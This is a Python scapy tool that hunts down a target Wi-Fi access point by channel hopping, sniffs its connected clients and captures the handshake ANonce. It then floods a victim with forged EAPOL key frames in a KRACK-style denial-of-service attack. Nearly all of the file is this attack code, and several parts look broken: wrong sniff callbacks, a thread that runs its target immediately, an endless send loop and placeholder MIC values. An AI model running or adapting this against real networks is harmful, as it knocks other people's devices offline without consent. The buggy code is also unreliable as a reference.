#!/usr/bin/env python3
import subprocess
import threading
import time
from scapy.layers import Dot11, Dot11Beacon, RadioTap, EAPOL, EAPOL_Key, LLC, SNAP
import scapy.all as scapy


class DOS:
    def __init__(self, wifi: str, ifc: str, t: int = 10) -> None:
        self.BSSID = wifi
        self.iface = ifc
        self.channel = 1
        self.tIntercept = t
        self.connectedUsers = set()
        self.running = False
        self.hopper_thread = None
        self.mac = set()
        # Needed for DOS using KRACK
        self.anonce = "0"
        self.dos = None

        self.setChannel()

    def stop(self):
        self.running = False

        if self.hopper_thread is not None:
            self.hopper_thread.join()
            self.hopper_thread = None

        print("[*] Restaurando la interfaz a modo managed...")

        try:
            self.setIface("managed")
        except Exception as e:
            print(e)

    def channelHopper(self):
        channels = [
            1,
            2,
            3,
            4,
            5,
            6,
            7,
            8,
            9,
            10,
            11,
            12,
            13,
            36,
            40,
            44,
            48,
            52,
            56,
            60,
            64,
            100,
            104,
            108,
            112,
            116,
            120,
            124,
            128,
            132,
            136,
            140,
            144,
        ]

        while self.running:
            for ch in channels:
                if not self.running:
                    break

                self.channel = ch

                subprocess.run(
                    [
                        "iw",
                        "dev",
                        self.iface,
                        "set",
                        "channel",
                        str(ch),
                    ],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                )

                time.sleep(0.3)

    def getChannel(self, pkt):
        if not pkt.haslayer(Dot11):
            return

        dot11 = pkt[Dot11]
        bssid = self.BSSID.lower()

        addresses = (
            dot11.addr1,
            dot11.addr2,
            dot11.addr3,
        )

        if not any(addr and addr.lower() == bssid for addr in addresses):
            return

        if pkt.haslayer(Dot11Beacon) or (dot11.type == 0 and dot11.subtype == 5):
            self.running = False

    def setChannel(self) -> None:
        self.running = True

        self.hopper_thread = threading.Thread(target=self.channelHopper, daemon=True)
        self.hopper_thread.start()

        while self.running:
            scapy.sniff(
                iface=self.iface,
                prn=self.getChannel,
                stop_filter=lambda pkt: not self.running,
                timeout=0.5,
                store=0,
            )

        self.running = False
        self.hopper_thread.join(timeout=1)

    def setIface(self, mode):
        subprocess.run(["ip", "link", "set", self.iface, "down"], check=False)
        subprocess.run(["iw", "dev", self.iface, "set", "type", mode], check=False)
        subprocess.run(["ip", "link", "set", self.iface, "up"], check=False)

    def classifyPkt(self, pkt) -> None:
        if pkt.haslayer(Dot11):
            wifi = pkt[Dot11]
            bssid = self.BSSID.lower()

            addresses = [wifi.addr1, wifi.addr2, wifi.addr3]

            if any(addr and addr.lower() == bssid for addr in addresses):
                for addr in addresses:
                    if addr and addr.lower() != self.BSSID.lower():
                        self.mac.add(addr)
                print(f"{wifi.addr2} -> {wifi.addr1}")

    def intercept(self) -> None:
        try:
            self.setIface("monitor")
            t = time.time()
            print(f"sniff in {self.channel}")
            while time.time() - t < self.tIntercept:
                scapy.sniff(
                    iface=self.iface,
                    prn=self.classifyPkt,
                    timeout=1,
                    store=0,
                )
        except Exception as e:
            print(f"[!] sniff error: {type(e).__name__}: {e}")
        finally:
            print("[DEBUG] sniff terminado")
            self.stop()

    def GetAnonce(self, pkt, victim: str) -> None:

        if pkt.haslayer(EAPOL) and pkt.haslayer(EAPOL_Key):
            eapol_key = pkt[EAPOL_Key]
            key_info = int(eapol_key.key_info)
            is_mic_set = bool(key_info & 0x0100)
            is_ack_set = bool(key_info & 0x0080)
            is_pairwise = bool(key_info & 0x0008)

            # unique features of msg1
            if is_ack_set and not is_mic_set:
                self.anonce = eapol_key.anonce
                return
            # unique features of msg2
            if (
                is_mic_set
                and not is_ack_set
                and is_pairwise
                and eapol_key.nonce != b"\x00" * 32
            ):
                self.running = False
                return

    def DOS(self, victim: str) -> None:
        self.setIface("monitor")
        while self.running:
            scapy.sniff(
                iface=self.iface,
                prn=self.classifyPkt(victim),
                timeout=1,
                store=0,
                stop_filter=lambda pkt: not self.running,
            )
        pkt = (
            RadioTap()
            / Dot11(
                type=2,
                subtype=0,
                addr1=victim,
                addr2=self.BSSID,
                addr3=self.BSSID,
            )
            / LLC()
            / SNAP()
            / EAPOL(version=1, type=3)
            / EAPOL_Key(
                descriptor_type=2,
                key_info=0x13CA,  # Install Bit, Ack, Key MIC, Secure, Pairwise
                key_length=16,
                replay_counter=2,
                nonce=self.anonce,
                key_iv=b"\x00" * 16,
                key_rsc=b"\x00" * 8,
                key_id=b"\x00" * 8,
                key_mic=b"FA:KE",
                key_data_len=1,
                key_data=b"FA:KE",
            )
        )

        def attack():
            while self.DOS:
                scapy.send(pkt)

        dos = threading.Thread(target=attack(), daemon=True)
        dos.start()

    def StopDOS(self):
        self.setIface("managed")

        if self.dos is not None:
            self.dos.join()
            self.dos = None


__all__ = ["DOS"]
